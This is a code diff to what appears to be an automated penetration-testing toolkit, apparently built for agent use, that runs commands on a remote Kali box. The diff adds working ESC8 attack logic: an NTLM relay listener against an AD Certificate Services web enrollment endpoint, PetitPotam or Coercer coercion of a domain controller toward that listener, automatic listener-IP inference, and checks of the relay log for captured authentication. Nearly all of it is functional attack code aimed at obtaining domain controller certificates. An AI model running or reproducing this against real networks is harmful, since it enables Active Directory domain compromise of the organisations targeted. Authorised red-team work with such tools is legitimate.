@@ -9,8 +9,10 @@ All tools execute commands remotely on the Kali attack box via AWS SSM.
 import asyncio
 import json
 import logging
+import os
 import re
 import shlex
+import socket
 import time
 import uuid
 from datetime import datetime, timezone
@@ -99,6 +101,27 @@ def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int
     """
     result = run_remote(cmd, timeout_seconds=timeout_seconds)
     return result.stdout, result.stderr, result.return_code
+
+
+def _infer_listener_ip(target: str | None = None) -> str | None:
+    """Infer a listener IP reachable from the target network."""
+    for key in ("ARES_ESC8_LISTENER", "ARES_RELAY_LISTENER", "ARES_LISTENER_IP", "POD_IP"):
+        value = os.getenv(key)
+        if value:
+            return value
+
+    if not target:
+        return None
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(1.0)
+        sock.connect((target, 88))
+        ip = sock.getsockname()[0]
+        sock.close()
+        return ip
+    except Exception:
+        return None
 
 
 def _write_users_file_remote(users: list[str], users_file: str) -> tuple[bool, str]:
@@ -2809,6 +2832,10 @@ class CertipyTools(Toolset):
         ca_host: str,
         template_name: str = "DomainController",
         target_upn: str | None = None,
+        coerce_target: str | None = None,
+        coerce_method: str = "petitpotam",
+        listener: str | None = None,
+        relay_timeout_seconds: int | None = None,
     ) -> str:
         """
         Set up ESC8 relay listener for ADCS web enrollment attack.
@@ -2826,6 +2853,10 @@ class CertipyTools(Toolset):
             ca_host: Certificate Authority hostname or IP
             template_name: Template to request (default: DomainController)
             target_upn: Optional UPN to request certificate for
+            coerce_target: Optional host to coerce (DC or CA host)
+            coerce_method: Coercion tool to use (petitpotam or coercer)
+            listener: Optional listener IP for relay (auto-detected if missing)
+            relay_timeout_seconds: Relay listener timeout (default: 600s)
 
         Returns:
             Relay listener status (run in background, then coerce auth)
@@ -2848,18 +2879,96 @@ class CertipyTools(Toolset):
 
         try:
             logger.info(f"[*] Starting ESC8 relay listener targeting {ca_host}")
-            # This runs as a listener - timeout after short period for testing
-            # In real use, this would run in background
-            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=30)
+            if relay_timeout_seconds is None:
+                relay_timeout_seconds = int(os.getenv("ARES_ESC8_RELAY_TIMEOUT", "600"))
+
+            if listener is None:
+                listener = _infer_listener_ip(ca_host)
+
+            if coerce_target:
+                coerce_target = str(coerce_target)
+                coerce_method = (coerce_method or "petitpotam").lower()
+                if coerce_method not in {"petitpotam", "coercer"}:
+                    coerce_method = "petitpotam"
+
+                if not listener:
+                    return "ESC8 relay setup failed: listener IP could not be determined"
+
+                relay_cmd = " ".join(shlex.quote(p) for p in cmd)
+                coerce_timeout = int(os.getenv("ARES_ESC8_COERCE_TIMEOUT", "20"))
+                coerce_cmd = (
+                    f"timeout {coerce_timeout}s petitpotam.py "
+                    f"{shlex.quote(listener)} {shlex.quote(coerce_target)}"
+                    if coerce_method == "petitpotam"
+                    else f"timeout {coerce_timeout}s coercer "
+                    f"{shlex.quote(listener)} {shlex.quote(coerce_target)}"
+                )
+
+                shell_cmd = (
+                    "set -e; "
+                    f"timeout {relay_timeout_seconds}s {relay_cmd} > /tmp/esc8_relay.log 2>&1 & "
+                    "relay_pid=$!; "
+                    "sleep 3; "
+                    f"{coerce_cmd} || true; "
+                    "sleep 5; "
+                    "tail -n 200 /tmp/esc8_relay.log || true"
+                )
+
+                logger.info(
+                    f"[*] ESC8 relay starting (listener={listener}, coerce={coerce_method}, "
+                    f"target={coerce_target}, ca={ca_host})"
+                )
+                command_timeout_seconds = max(30, coerce_timeout + 30)
+                stdout, stderr, _ = _run_tool(
+                    ["bash", "-lc", shell_cmd], timeout_seconds=command_timeout_seconds
+                )
+                result = (stdout or "") + "\n" + (stderr or "")
+                relay_lower = result.lower()
+                saw_auth = any(
+                    marker in relay_lower
+                    for marker in [
+                        "ntlm",
+                        "auth",
+                        "smb",
+                        "http",
+                        "incoming",
+                        "connection",
+                        "relay",
+                    ]
+                )
+                if not saw_auth:
+                    return (
+                        "⚠️ ESC8 RELAY STARTED BUT NO AUTH RECEIVED\n"
+                        f"→ Coercion fired: {coerce_method} against {coerce_target}\n"
+                        f"→ Listener: {listener}\n"
+                        f"→ Target CA: {ca_host}\n"
+                        "→ Check network path to certsrv/SMB/RPC and target patching\n\n" + result
+                    )
+                return (
+                    "📋 ESC8 RELAY + COERCION\n"
+                    "→ Relay listener configured for ADCS web enrollment\n"
+                    f"→ Coercion: {coerce_method} against {coerce_target}\n"
+                    f"→ Listener: {listener}\n"
+                    f"→ Target CA: {ca_host}\n\n" + result
+                )
+
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=relay_timeout_seconds)
 
             result = stdout + "\n" + (stderr or "")
+            relay_lower = result.lower()
+            saw_auth = any(
+                marker in relay_lower
+                for marker in ["ntlm", "auth", "smb", "http", "incoming", "connection", "relay"]
+            )
 
             return (
                 "📋 ESC8 RELAY SETUP\n"
                 "→ Relay listener configured for ADCS web enrollment\n"
                 "→ Use petitpotam or coercer to force DC authentication\n"
                 "→ Relayed auth will request DC certificate\n"
-                f"→ Target CA: {ca_host}\n\n" + result
+                f"→ Target CA: {ca_host}\n"
+                f"→ Listener: {listener or 'unknown'}\n"
+                f"→ Auth seen: {'yes' if saw_auth else 'no'}\n\n" + result
             )
 
         except Exception as e:
